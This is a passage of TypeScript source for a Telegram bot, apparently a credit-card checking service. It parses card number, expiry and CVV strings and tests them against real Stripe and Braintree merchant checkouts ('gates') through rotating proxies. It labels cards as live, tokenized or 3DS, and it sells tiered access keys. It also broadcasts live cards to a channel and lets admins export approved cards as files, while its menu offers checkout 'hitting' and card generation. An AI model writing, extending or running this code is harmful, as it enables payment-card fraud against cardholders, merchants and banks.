        const routed = pickGateForCountry(activeGates, cc);
        if (routed) return routed;
      }
    }
    const isRandom = userRandomGate.get(telegramId) ?? false;
    const selectedId = userGateSelection.get(telegramId);
    if (isRandom) return pick(activeGates);
    if (selectedId) {
      const found = activeGates.find(g => g.id === selectedId);
      if (found) return found;
    }
  }

  return activeGates[0];
}

async function realCheck(cardStr: string, activeGate: any): Promise<{ status: string; response: string; latency: number }> {
  return runGateCheck(cardStr, activeGate, true);
}

function parseCard(input: string): { number: string; month: string; year: string; cvv: string } | null {
  const parts = input.trim().split(/[|:;\s,]+/);
  if (parts.length < 4) return null;
  const [number, month, year, cvv] = parts;
  if (!/^\d{13,19}$/.test(number)) return null;
  if (!/^\d{1,2}$/.test(month)) return null;
  if (!/^\d{2,4}$/.test(year)) return null;
  if (!/^\d{3,4}$/.test(cvv)) return null;
  const fullYear = year.length === 2 ? `20${year}` : year;
  return { number, month: month.padStart(2, "0"), year: fullYear, cvv };
}

function fullCardStr(card: { number: string; month: string; year: string; cvv: string }): string {
  return `${card.number}|${card.month}|${card.year}|${card.cvv}`;
}

function formatCheckResult(cardFull: string, result: { status: string; response: string; latency: number }, gateName: string, showFullGate: boolean): string {
  const isLive = result.status === "approved";
  const isDead = result.status === "declined";

  const parts = parseRichResponse(result.response);
  const mainResult = parts.headline;
  // Pull the locals back out so the rest of the function reads as before.
  const cardInfo = parts.cardInfo;
  const bankName = parts.bankName;
  let   declineCode = parts.declineCode;   // re-derived below for the isDead branch
  const isTokenOnly = parts.isTokenOnly;
  const amount = parts.amount;
  const proxyTag = parts.proxyTag;

  const isCvvLive = /CVV LIVE/i.test(mainResult);
  const isCcnLive = /CCN LIVE/i.test(mainResult);
  const is3ds = /3DS Required/i.test(mainResult);
  const isTokenized = /TOKENIZED/i.test(mainResult);

  // Pre-classify via keyword set (paycv.py-style) for finer-grained tags.
  // Stripe gates often return human-readable strings (GiveWP, Charitable,
  // Gravity Forms) where the upstream classifier didn't have a decline_code
  // to map. The keyword tag fills that gap with HIT/CCN/CVV/3DS/LOW_FUND/
  // EXPIRED/DECLINED labels that match the reference scripts' vocabulary.
  const kwTag = classifyStripeResponseTag(result.response);

  let statusIcon: string, statusLabel: string;
  if (isCvvLive) {
    statusIcon = "🟢";
    statusLabel = "CVV LIVE";
  } else if (isCcnLive || is3ds) {
    statusIcon = "🟡";
    statusLabel = kwTag?.tag === "3DS" ? "3DS REQUIRED" : "CCN LIVE";
  } else if (isTokenized) {
    statusIcon = "🔵";
    statusLabel = "TOKENIZED";
  } else if (isLive) {
    // HIT is the strongest "approved" signal — show it specifically when
    // the page text confirmed success rather than just our classifier
    // inferring it from a charge token.
    statusIcon = "✅";
    statusLabel = kwTag?.tag === "HIT" ? "HIT" : "APPROVED";
  } else if (isDead) {
    statusIcon = "❌";
    // Use the keyword tag's label when present so the user sees the exact
    // reason (LOW FUND / EXPIRED / RATE LIMITED / etc) instead of generic DECLINED.
    const deadLabels: Partial<Record<StripeResponseTag, string>> = {
      LOW_FUND: "LOW FUND", EXPIRED: "EXPIRED",
      INCORRECT: "INCORRECT", INVALID: "INVALID",
      EXCEED: "LIMIT EXCEEDED", AVS_FAIL: "AVS MISMATCH",
      DECLINED: "DECLINED",
    };
    statusLabel = (kwTag && deadLabels[kwTag.tag]) || "DECLINED";
  } else {
    statusIcon = "⚠️";
    // Coarse error → use keyword tag if it's specific (CAPTCHA / RATE_LIMIT /
    // PROXY_FAIL / RISK) so admin knows whether to retry, change proxy, etc.
    const errLabels: Partial<Record<StripeResponseTag, string>> = {
      CAPTCHA: "CAPTCHA WALL", RATE_LIMIT: "RATE LIMITED",
      RISK: "RISK HOLD",       PROXY_FAIL: "PROXY FAILED",
    };
    statusLabel = (kwTag && errLabels[kwTag.tag]) || "ERROR";
  }

  if (isDead) {
    const codeMatch = result.response.match(/(?:DECLINED\s*✗?\s*)([^|]+)/i);
    if (codeMatch) declineCode = codeMatch[1].trim();
  }

  const displayGate = showFullGate ? gateName : maskGateName(gateName);
  const latencyStr = result.latency >= 1000 ? `${(result.latency / 1000).toFixed(1)}s` : `${result.latency}ms`;

  let msg = `${statusIcon} *${statusLabel}*\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `*Card:* \`${isMaskEnabled() ? maskCardLine(cardFull) : cardFull}\`\n`;

  if (isCvvLive) {
    msg += `*Result:* ✓ Bank Confirmed — CVV Match\n`;
  } else if (is3ds) {
    msg += `*Result:* ⚡ 3DS Required — Card Active\n`;
  } else if (isCcnLive) {
    const detail = /CVV Wrong/i.test(mainResult) ? "CVV Mismatch" : /Insufficient/i.test(mainResult) ? "Insufficient Funds" : /Do Not Honor/i.test(mainResult) ? "Do Not Honor" : "Card Active";
    msg += `*Result:* ⚡ ${detail}\n`;
  } else if (isTokenized) {
    msg += `*Result:* Token Created — CVV Unchecked\n`;
  } else if (isDead && declineCode) {
    msg += `*Result:* ${declineCode}\n`;
  } else {
    msg += `*Result:* ${mainResult}\n`;
  }

  if (cardInfo) msg += `*Info:* ${cardInfo}\n`;
  if (amount)   msg += `*Amount:* ${amount}\n`;
  if (bankName) msg += `*Bank:* ${tgEscape(bankName)}\n`;
  if (proxyTag) {
    const m = proxyTag.match(/^pool:?(.*)$/);
    const sticky = proxyTag.match(/^sticky:(.+)$/);
    const label = sticky
      ? `sticky \`${tgEscape(sticky[1])}\``
      : m && m[1] ? `${m[1].toUpperCase()} pool`
      : "rotating pool";
    msg += `*Proxy:* ${label}\n`;
  }
  const chargeTok = parts.chargeTok || undefined;
  const intentTok = parts.intentTok || undefined;
  if (chargeTok)      msg += `*Charge:* \`${isMaskEnabled() ? maskChargeId(chargeTok) : chargeTok}\`\n`;
  else if (intentTok) msg += `*Intent:* \`${isMaskEnabled() ? maskIntentId(intentTok) : intentTok}\`\n`;
  const threeDsUrl = (result as any).threeDsUrl as string | undefined;
  const threeDsType = (result as any).threeDsType as ("redirect" | "sdk" | "none" | undefined);
  const threeDsAttempt = (result as any).threeDsAttempt as ("frictionless_passed" | "frictionless_failed" | "challenge_only" | undefined);
  if (is3ds) {
    if (threeDsAttempt === "frictionless_failed") {
      msg += `*3DS:* Frictionless attempted, bank requires full challenge\n`;
    } else if (threeDsAttempt === "challenge_only") {
      msg += `*3DS:* Challenge required (no frictionless probe)\n`;
    }
    if (threeDsType === "redirect" && threeDsUrl) {
      msg += `*3DS URL:* [open challenge](${threeDsUrl})\n`;
    } else if (threeDsType === "sdk") {
      msg += `*3DS Type:* Stripe.js fingerprint (no clickable URL; requires JS env)\n`;
    } else if (intentTok) {
      msg += `*3DS Action:* Complete via Stripe SDK with intent above\n`;
    }
  } else if (threeDsAttempt === "frictionless_passed") {
    msg += `*3DS:* Frictionless ✓ — bank auto-authenticated\n`;
  }
  if (isTokenOnly) msg += `*Note:* ⚠ No bank confirmation\n`;
  msg += `\n*Gate:* ${displayGate}  ·  *Time:* ${latencyStr}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━`;

  return msg;
}

export async function startBot(): Promise<boolean> {
  const settings = await storage.getBotSettings();
  if (!settings.botToken) {
    return false;
  }

  try {
    if (bot) {
      await stopBot();
    }

    // Start with polling=false so we can deleteWebHook + verify token first.
    // A previously-set webhook (from @BotFather or a prior dashboard setup)
    // will make getUpdates return 409 Conflict and polling silently dies.
    bot = new TelegramBot(settings.botToken, { polling: false });

    // Verify the token is valid by calling getMe() — gives a clear error
    // message instead of polling silently failing forever with a bad token.
    let botIdentity: any;
    try {
      botIdentity = await bot.getMe();
      console.log(`[telegram] ✓ token valid — bot is @${botIdentity.username} (id: ${botIdentity.id})`);
    } catch (e: any) {
      const msg = e?.message || String(e);
      console.error(`[telegram] ✗ token rejected by Telegram: ${msg}`);
      // Translate the most common error codes into actionable hints — users
      // see 404/401 and have no idea what to do. These messages tell them.
      if (/404/.test(msg)) {
        console.error(`[telegram]   404 = bot does NOT exist. Causes:`);
        console.error(`[telegram]     • Bot was deleted via @BotFather /deletebot`);
        console.error(`[telegram]     • Token has a typo (an "I"/"l" or "O"/"0" swap)`);
        console.error(`[telegram]   Fix: go to @BotFather → /mybots → pick your bot → API Token`);
        console.error(`[telegram]        copy the FULL token, then re-run:`);
        console.error(`[telegram]          python start.py --bot-mode --bot-token <TOKEN>`);
        console.error(`[telegram]        OR create a new bot:  @BotFather → /newbot`);
      } else if (/401/.test(msg)) {
        console.error(`[telegram]   401 = token format is wrong or has been revoked.`);
        console.error(`[telegram]   Fix: @BotFather → /token → pick your bot → tap "Revoke" → new token`);
      } else if (/ENOTFOUND|ETIMEDOUT|ECONNREFUSED/.test(msg)) {
        console.error(`[telegram]   Network error reaching api.telegram.org. Check Termux DNS / VPN / firewall.`);
      }
      await storage.createSystemLog({
        level: "ERROR",
        message: `Bot token rejected (${msg.slice(0, 80)})`,
        source: "telegram",
      });
      bot = null;
      // Clear the stored token so a fresh re-run with --bot-token <NEW> writes
      // the corrected value to DB on bootstrap (the bootstrap only writes when
      // the field is empty — without this, the user is stuck with the bad token).
      try { await storage.updateBotSettings({ botToken: "" } as any); } catch {}
      return false;
    }

    // Clear any existing webhook so polling can claim updates.
    try {
      await bot.deleteWebHook();
    } catch (e: any) {
      // Non-fatal — bot may not have had a webhook anyway.
      console.warn(`[telegram] deleteWebHook warning: ${e?.message || e}`);
    }

    // Register error listeners BEFORE startPolling so first-cycle errors
    // (409 conflict, network failure) are surfaced instead of swallowed.
    //
    // Throttling: a network blip on mobile (Termux/WiFi-4G handoff) emits a
    // polling_error every few seconds while node-telegram-bot-api retries.
    // We log the first occurrence loudly and then suppress further logs of
    // the same error type until 60s pass, so the terminal stays usable.
    // Terminal errors (401/409) stop polling entirely — there's no point
    // retrying when the token is wrong or another instance owns the slot.
    let _lastPollErrLog = 0;
    let _lastPollErrKind = "";
    const POLL_ERR_THROTTLE_MS = 60 * 1000;

    bot.on("polling_error", async (err: any) => {
      const code = (err as any)?.code || "polling_error";
      const msg = err?.message || String(err);
      const isConflict = msg.includes("409") || msg.includes("Conflict");
      const isAuth     = msg.includes("401") || msg.includes("Unauthorized");
      const kind = isConflict ? "409" : isAuth ? "401" : (code === "EFATAL" || /ETELEGRAM/.test(code)) ? "telegram" : "network";

      if (isConflict) {
        console.error(`[telegram] 409 CONFLICT: another instance is polling this bot token. Stopping. Fix: stop the other instance OR revoke + reissue the token via @BotFather.`);
        try { await bot?.stopPolling(); } catch {}
        isPolling = false;
        await storage.createSystemLog({ level: "ERROR", message: "Bot stopped: 409 conflict (another instance polling)", source: "telegram" });
        return;
      }
      if (isAuth) {
        console.error(`[telegram] 401 UNAUTHORIZED: token is invalid or revoked. Stopping. Update the token via dashboard or restart with --bot-token <NEW_TOKEN>.`);
        try { await bot?.stopPolling(); } catch {}
        isPolling = false;
        await storage.createSystemLog({ level: "ERROR", message: "Bot stopped: 401 unauthorized (invalid token)", source: "telegram" });
        return;
      }
      // Network/transient — throttle so a 4G outage doesn't flood the log
      const now = Date.now();
      if (kind !== _lastPollErrKind || now - _lastPollErrLog > POLL_ERR_THROTTLE_MS) {
        console.error(`[telegram] polling_error (${code}): ${msg.slice(0, 200)}`);
        _lastPollErrLog = now;
        _lastPollErrKind = kind;
      }
    });
    bot.on("webhook_error", (err: any) => console.error(`[telegram] webhook_error: ${err?.message || err}`));
    bot.on("error",         (err: any) => console.error(`[telegram] bot error: ${err?.message || err}`));

    // ── Admin commands in the broadcast channel ──────────────────────────────
    // The owner can post commands (currently /chk) directly in the configured
    // channel. The bot executes the command and DMs the result back to the
    // owner — it does NOT post the result into the channel (PAN + verdict
    // would leak to every member). Only the owner is honored; anonymous
    // posts and posts by non-owner admins are ignored.
    //
    // Hard requirements (verified at runtime, warned about clearly):
    //   1. Bot's privacy mode must be OFF (set via @BotFather)
    //   2. Bot must be an admin in the channel
    //   3. The post must be SIGNED (admin posting as themselves, not anonymous)
    bot.on("channel_post", async (msg: any) => {
      try {
        const text: string = msg?.text || "";
        if (!text.startsWith("/")) return;
        const settings = await storage.getBotSettings();
        // Only react to posts in the configured broadcast channel — ignore
        // any other channels the bot might be admin in.
        if (!settings.chatId || String(msg.chat?.id) !== String(settings.chatId)) return;
        // Verify the poster identity. Telegram exposes msg.from when the
        // admin has "Sign Messages" enabled. Anonymous admin posts (no from
        // field) are deliberately NOT honored — we can't tell them apart
        // from anonymous user posts.
        const fromId = msg.from?.id?.toString();
        if (!fromId) {
          console.log("[telegram] channel command ignored — post is anonymous (Sign Messages not enabled for poster)");
          return;
        }
        // Strict: only the configured ownerId may issue channel commands.
        // Non-owner admins (even legitimate ones) must DM the bot like normal.
        if (!settings.ownerId || fromId !== settings.ownerId) {
          console.log(`[telegram] channel command from ${fromId} ignored — not the owner (${settings.ownerId || "none"})`);
          return;
        }
        // Currently only /chk is supported in-channel — the only command
        // valuable enough to justify the channel-command surface area. More
        // can be added later as concrete use cases come up.
        const chkMatch = text.match(/^\/chk(?:@\w+)?\s+(.+)\s*$/i);
        if (!chkMatch) {
          // Other commands in channel: silently ignore. We DON'T reply with
          // "use it in DM" because that would broadcast the rebuke.
          console.log(`[telegram] channel command "${text.slice(0, 32)}" ignored — only /chk is supported in channel`);
          return;
        }
        const cardInput = chkMatch[1].trim();
        const card = parseCard(cardInput);
        if (!card) {
          // Quiet DM, not channel.
          await bot!.sendMessage(fromId, "❌ Channel /chk: format must be `/chk CC|MM|YYYY|CVV`", { parse_mode: "Markdown" }).catch(() => {});
          return;
        }
        const activeGate = await getGateForUser(fromId, cardInput);
        if (!activeGate) {
          await bot!.sendMessage(fromId, "⚠️ No active gate. Add one in the dashboard.").catch(() => {});
          return;
        }
        // Tell the owner we picked up the command (via DM, not channel).
        await bot!.sendMessage(fromId, `📡 Channel /chk picked up — checking through *${tgEscape(activeGate.name)}*…`, { parse_mode: "Markdown" }).catch(() => {});
        const result = await realCheck(cardInput, activeGate);
        // Reply via DM with the full result. The same result will ALSO
        // broadcast to the channel via notifyLiveCardToChannel (with masked
        // PAN per Fix 1) if the card is live — that's the existing flow.
        const formatted = formatCheckResult(cardInput, result, activeGate.name, true /* hasAdminAccess */);
        await bot!.sendMessage(fromId, `📡 *Channel /chk result*\n${formatted}`, { parse_mode: "Markdown" }).catch(() => {});
        if (result.status === "approved") {
          notifyLiveCardToChannel(cardInput, result, activeGate.name, fromId, activeGate.id);
        }
      } catch (e: any) {
        console.error(`[telegram] channel_post handler error: ${e?.message ?? e}`);
      }
    });

    await bot.startPolling({ restart: true });
    isPolling = true;

    console.log(`[telegram] ✓ polling started — message @${botIdentity.username} to begin`);

    // Register the command menu so Telegram's native "/" autocomplete shows
    // each command + a short description. Without this users had to type
    // commands from memory. The list is filtered by feature toggles so only
    // currently-enabled commands appear in the menu. Called once at start;
    // also re-called from the /features toggle handler when admin flips one.
    syncBotCommandsMenu().catch(e => console.error(`[telegram] setMyCommands failed: ${e?.message || e}`));
    await storage.createSystemLog({
      level: "SUCCESS",
      message: `Telegram bot @${botIdentity.username} polling started`,
      source: "telegram",
    });

    bot.onText(/\/start/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const username = msg.from?.username || "Unknown";

      // Load settings to get defaultDailyLimit + custom welcome message
      const sysSettings = await storage.getBotSettings();

      let botUser = await storage.getBotUser(telegramId);
      if (!botUser) {
        botUser = await storage.createBotUser({
          telegramId,
          username: `@${username}`,
          role: sysSettings.ownerId === telegramId ? "owner" : "user",
          dailyLimit: (sysSettings as any).defaultDailyLimit ?? 100,
          usageToday: 0,
          totalHits: 0,
          totalChecks: 0,
          banned: false,
        });
      }

      const hasAdmin = await checkAdmin(telegramId, botUser);
      const customMsg = (sysSettings as any).welcomeMessage as string | undefined;

      let welcomeMsg: string;
      if (customMsg) {
        // Replace placeholders in custom message
        welcomeMsg = customMsg
          .replace(/\{username\}/g, username)
          .replace(/\{role\}/g, botUser.role.toUpperCase())
          .replace(/\{limit\}/g, String(botUser.dailyLimit));
      } else {
        const hitterOn = (sysSettings as any).hitterEnabled !== false;
        const genOn    = (sysSettings as any).genEnabled !== false;
        welcomeMsg =
`🔰 *H@0 CHK V8.0*
━━━━━━━━━━━━━━━━━━━━
Welcome, *${username}*!

*Commands:*
/chk \`CC|MM|YYYY|CVV\` — Check card
/mass — Mass check (send list)${hitterOn ? "\n/hit `URL BIN [count]` — Hit checkout with BIN" : ""}${genOn ? "\n/gen `BIN [count]` — Generate cards" : ""}
/redeem \`KEY\` — Redeem access key
/myinfo — Account info
/stats — System stats
/help — All commands`;
        if (hasAdmin) {
          welcomeMsg += `\n\n👑 *Admin Access Active*`;
        } else {
          welcomeMsg += `\n\n🔑 Redeem a key: /redeem KEY`;
        }
        welcomeMsg += `\n*Role:* ${botUser.role.toUpperCase()}
*Limit:* ${botUser.dailyLimit}/day
━━━━━━━━━━━━━━━━━━━━`;
      }

      bot?.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown" });
    });

    bot.onText(/\/login(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const password = match?.[1]?.trim();

      if (!password) {
        bot?.sendMessage(chatId, "🔑 Usage: `/login PASSWORD`", { parse_mode: "Markdown" });
        return;
      }

      const adminPwd = await getAdminPassword();
      if (password === adminPwd) {
        adminSessions.add(telegramId);
        const botUser = await storage.getBotUser(telegramId);
        if (botUser && botUser.role !== "owner") {
          await storage.updateBotUser(botUser.id, { role: "owner" });
        }
        await storage.createSystemLog({ level: "INFO", message: `Admin login via Telegram: ${telegramId}`, source: "telegram" });
        bot?.sendMessage(chatId,
`👑 *Admin Access Granted*
━━━━━━━━━━━━━━━━━━━━
You now have full access:
/gates — View all gates
/setgate — Select gate
/randomgate — Toggle random mode
/autoroute — Toggle country routing (US card → US gate)
/maskcc — Mask card / charge / intent in responses
/addgate — Add gate (auto-detect / mass / manual)
/ban /unban — User management
/broadcast — Broadcast message
/reset — Reset system data
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });
      } else {
        bot?.sendMessage(chatId, "❌ Invalid password.");
      }
    });

    bot.onText(/\/redeem(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const keyStr = match?.[1]?.trim();

      if (!keyStr) {
        bot?.sendMessage(chatId, "🔑 Usage: `/redeem H0-XXXX-XXXX-XXXX`", { parse_mode: "Markdown" });
        return;
      }

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) {
        bot?.sendMessage(chatId, "❌ Not registered. Send /start first.");
        return;
      }

      const key = await storage.getAccessKey(keyStr);
      if (!key) {
        bot?.sendMessage(chatId, "❌ Invalid key. Check and try again.");
        return;
      }
      if (key.status !== "unused") {
        bot?.sendMessage(chatId, "❌ Key already used or expired.");
        return;
      }

      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + (key.durationDays || 30));

      await storage.updateAccessKey(key.id, {
        status: "redeemed",
        redeemedBy: telegramId,
        expiresAt,
      });

      await storage.updateBotUser(botUser.id, {
        dailyLimit: key.dailyLimit || 1000,
        keyId: key.id,
      });

      await storage.createSystemLog({
        level: "SUCCESS",
        message: `Key ${keyStr} redeemed by ${botUser.username || telegramId}`,
        source: "telegram",
      });

      bot?.sendMessage(chatId,
`✅ *Key Redeemed!*
━━━━━━━━━━━━━━━━━━━━
*Key:* \`${keyStr}\`
*Duration:* ${key.durationDays} days
*Daily Limit:* ${key.dailyLimit} checks
*Expires:* ${expiresAt.toLocaleDateString()}
━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });
    });

    bot.onText(/^\/chk(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      if (!isFeatureEnabled("chk")) { bot?.sendMessage(msg.chat.id, "🚫 /chk is currently disabled by the owner."); return; }
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const cardInput = match?.[1]?.trim() || "";
      if (!cardInput) {
        bot?.sendMessage(chatId, "💳 *Usage:* `/chk CC|MM|YYYY|CVV`\n\nExample: `/chk 4111111111111111|12|2027|123`", { parse_mode: "Markdown" });
        return;
      }

      try {
        const botUser = await storage.getBotUser(telegramId);
        if (!botUser) {
          bot?.sendMessage(chatId, "❌ Not registered. Send /start first.");
          return;
        }
        if (botUser.banned) {
          bot?.sendMessage(chatId, "🚫 Account banned.");
          return;
        }

        // Tiered access — admin/redeemed/free all pass /chk, but with
        // different daily caps and different "no-access" hints. Free tier
        // requires live channel membership verification.
        const tier = await getUserTier(telegramId, botUser);
        const hasAdminAccess = tier === "admin";

        if (tier === "guest") {
          // Tell them BOTH paths — channel membership OR redeem key — so they
          // can pick whichever applies. If freeTierEnabled is off, only the
          // redeem path is shown.
          const settingsForHint = await storage.getBotSettings();
          if (settingsForHint.freeTierEnabled && settingsForHint.chatId) {
            bot?.sendMessage(chatId,
              "🔒 *Access required*\n\n" +
              "Two paths to use /chk:\n" +
              "• *Free tier:* Join our channel and try /chk again (free " + settingsForHint.freeTierDailyLimit + "/day)\n" +
              "• *Premium:* `/redeem H0-XXXX-XXXX-XXXX`\n\n" +
              "_All other commands require a key._",
              { parse_mode: "Markdown" });
          } else {
            bot?.sendMessage(chatId, "🔑 Redeem an access key first: `/redeem H0-XXXX-XXXX-XXXX`", { parse_mode: "Markdown" });
          }
          return;
        }

        // Per-tier daily caps. Admin = unlimited. Redeemed = user's
        // dailyLimit (from key). Free = settings.freeTierDailyLimit.
        if (tier === "free") {
          const settingsForLimit = await storage.getBotSettings();
          const freeCap = settingsForLimit.freeTierDailyLimit || 5;
          if (botUser.usageToday >= freeCap) {
            bot?.sendMessage(chatId,
              `⚠️ *Free tier daily limit reached* (${botUser.usageToday}/${freeCap})\n\n` +
              "Resets at UTC midnight. For higher limits, `/redeem H0-XXXX-XXXX-XXXX`.",
              { parse_mode: "Markdown" });
            return;
          }
        } else if (tier === "redeemed") {
          if (botUser.usageToday >= botUser.dailyLimit) {
            bot?.sendMessage(chatId, "⚠️ Daily limit reached.");
            return;
          }
        }
        // Admin: no daily cap.

        if (!hasAdminAccess && botUser.keyId) {
          const key = await storage.getAccessKeyById(botUser.keyId);
          if (key && key.expiresAt && new Date(key.expiresAt) < new Date()) {
            bot?.sendMessage(chatId, "⚠️ Your access key has expired. Redeem a new one: `/redeem KEY`", { parse_mode: "Markdown" });
            return;
          }
        }

        const card = parseCard(cardInput);
        if (!card) {
          bot?.sendMessage(chatId, "❌ Format: `/chk CC|MM|YYYY|CVV`", { parse_mode: "Markdown" });
          return;
        }

        const activeGate = await getGateForUser(telegramId, cardInput);
        if (!activeGate) {
          bot?.sendMessage(chatId, "⚠️ No active gate. Admin must add a gate first.");
          return;
        }

        const gateSettings = (activeGate.settings as Record<string, any>) || {};
        if (!gateSettings.publicKey && !gateSettings.btClientToken) {
          bot?.sendMessage(chatId, `⚠️ Gate *${activeGate.name}* has no key configured. Re-detect or set up the gate.`, { parse_mode: "Markdown" });
          return;
        }

        const displayGateName = hasAdminAccess ? activeGate.name : maskGateName(activeGate.name);
        bot?.sendMessage(chatId, `⏳ Checking via *${displayGateName}*...`, { parse_mode: "Markdown" });

        const result = await realCheck(cardInput, activeGate);
        const cardFull = fullCardStr(card);

        if (result.status === "error" && result.response === "No gate key configured") {
          bot?.sendMessage(chatId, `⚠️ Gate error: no key found for *${displayGateName}*. Check gate configuration.`, { parse_mode: "Markdown" });
          return;
        }

        await storage.createCheckResult({
          card: cardFull,
          status: result.status === "approved" ? "approved" : result.status === "declined" ? "declined" : "error",
          response: result.response,
          rawSnippet: (result as any).rawSnippet ?? null,
          gate: activeGate.name,
          latency: result.latency,
          checkedBy: telegramId,
        });

        await storage.updateBotUser(botUser.id, {
          usageToday: botUser.usageToday + 1,
          totalChecks: botUser.totalChecks + 1,
          totalHits: result.status === "approved" ? botUser.totalHits + 1 : botUser.totalHits,
        });

        const formattedMsg = formatCheckResult(cardFull, result, activeGate.name, hasAdminAccess);
        bot?.sendMessage(chatId, formattedMsg, { parse_mode: "Markdown" });

        notifyLiveCardToChannel(cardFull, result, activeGate.name, telegramId, activeGate.id);
      } catch (err: any) {
        log(`[CHK ERROR] ${err.message}`, "telegram");
        bot?.sendMessage(chatId, `⚠️ Check failed: ${err.message?.substring(0, 100) || "Unknown error"}. Try again.`);
      }
    });

    bot.onText(/\/notify/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) {
        bot?.sendMessage(chatId, "❌ Not registered. Send /start first.");
        return;
      }
      const newState = !botUser.notifyLive;
      await storage.updateBotUser(botUser.id, { notifyLive: newState });
      bot?.sendMessage(chatId, `🔔 Live notifications: *${newState ? "ON" : "OFF"}*\n${newState ? "You'll be notified when live CCs are found." : "Notifications silenced."}`, { parse_mode: "Markdown" });
    });

    bot.onText(/\/download/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      const approved = await storage.getApprovedCards();
      if (approved.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No approved cards found.");
        return;
      }
      const content = approved.map(r => r.card).join("\n");
      const buffer = Buffer.from(content, "utf-8");
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
      await bot?.sendDocument(chatId, buffer, {
        caption: `✅ *Approved Cards*\n*Total:* ${approved.length}\n*Exported:* ${new Date().toLocaleString()}`,
        parse_mode: "Markdown",
      }, {
        filename: `approved_cards_${timestamp}.txt`,
        contentType: "text/plain",
      });
    });

    // Anchored — without ^\/export\b this also fired for /exportgates,
    // causing the CSV-export menu to pop up alongside the JSON gate dump.
    bot.onText(/^\/export(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      bot?.sendMessage(chatId, "📊 *Export Check Results*\nSelect filter and format:", {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "📋 All — CSV", callback_data: "export_csv_all" },
              { text: "✅ Approved — CSV", callback_data: "export_csv_approved" },
              { text: "❌ Declined — CSV", callback_data: "export_csv_declined" },
            ],
            [
              { text: "📋 All — TXT", callback_data: "export_txt_all" },
              { text: "✅ Approved — TXT", callback_data: "export_txt_approved" },
              { text: "❌ Declined — TXT", callback_data: "export_txt_declined" },
            ],
          ],
        },
      });
    });

    bot.on("callback_query", async (query) => {
      if (!query.data?.startsWith("export_")) return;
      const chatId = query.message?.chat.id;
      const telegramId = query.from?.id?.toString() || "";
      if (!chatId) return;

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.answerCallbackQuery(query.id, { text: "Admin only" });
        return;
      }

      bot?.answerCallbackQuery(query.id, { text: "Generating export..." });

      const parts = query.data.split("_");
      const format = parts[1];
      const filter = parts[2];

      if (!["csv", "txt"].includes(format) || !["all", "approved", "declined"].includes(filter)) {
        bot?.sendMessage(chatId, "⚠️ Invalid export option.");
        return;
      }

      const statusFilter = filter === "approved" ? "approved" : filter === "declined" ? "declined" : undefined;
      const results = await storage.getCheckResults(statusFilter ? { status: statusFilter, noLimit: true } : { noLimit: true });

      if (results.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No check results found for this filter.");
        return;
      }

      const timestamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
      const filterLabel = filter === "all" ? "all" : filter;

      if (format === "csv") {
        const csvHeader = "Card,Status,Response,Gate,Latency(ms),Checked By,Date";
        const csvRows = results.map(r => {
          const card = `"${(r.card || "").replace(/"/g, '""')}"`;
          const status = r.status || "";
          const response = `"${(r.response || "").replace(/"/g, '""')}"`;
          const gate = `"${(r.gate || "").replace(/"/g, '""')}"`;
          const latency = r.latency || 0;
          const checkedBy = r.checkedBy || "";
          const date = r.createdAt ? new Date(r.createdAt).toISOString() : "";
          return `${card},${status},${response},${gate},${latency},${checkedBy},${date}`;
        });
        const csvContent = [csvHeader, ...csvRows].join("\n");
        const buffer = Buffer.from(csvContent, "utf-8");
        await bot?.sendDocument(chatId, buffer, {
          caption: `📊 *Check Results Export*\n*Filter:* ${filterLabel.toUpperCase()}\n*Total:* ${results.length}\n*Format:* CSV\n*Date:* ${new Date().toLocaleString()}`,
          parse_mode: "Markdown",
        }, {
          filename: `checks_${filterLabel}_${timestamp}.csv`,
          contentType: "text/csv",
        });
      } else {
        const txtContent = results.map(r => {
          const date = r.createdAt ? new Date(r.createdAt).toLocaleString() : "";
          return `${r.card} | ${r.status} | ${r.response || ""} | ${r.gate || ""} | ${r.latency || 0}ms | ${r.checkedBy || ""} | ${date}`;
        }).join("\n");
        const buffer = Buffer.from(txtContent, "utf-8");
        await bot?.sendDocument(chatId, buffer, {
          caption: `📊 *Check Results Export*\n*Filter:* ${filterLabel.toUpperCase()}\n*Total:* ${results.length}\n*Format:* TXT\n*Date:* ${new Date().toLocaleString()}`,
          parse_mode: "Markdown",
        }, {
          filename: `checks_${filterLabel}_${timestamp}.txt`,
          contentType: "text/plain",
        });
      }
    });

    async function executeMassCheck(chatId: number, telegramId: string, lines: string[], gateOverride?: any) {
      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) return;

      const hasAdminAccess = await checkAdmin(telegramId, botUser);
      let count = lines.length;

      // Admins are not bound by the per-user daily limit (their batch size is
      // already governed by the mass-check limit). Key-holders are: rather than
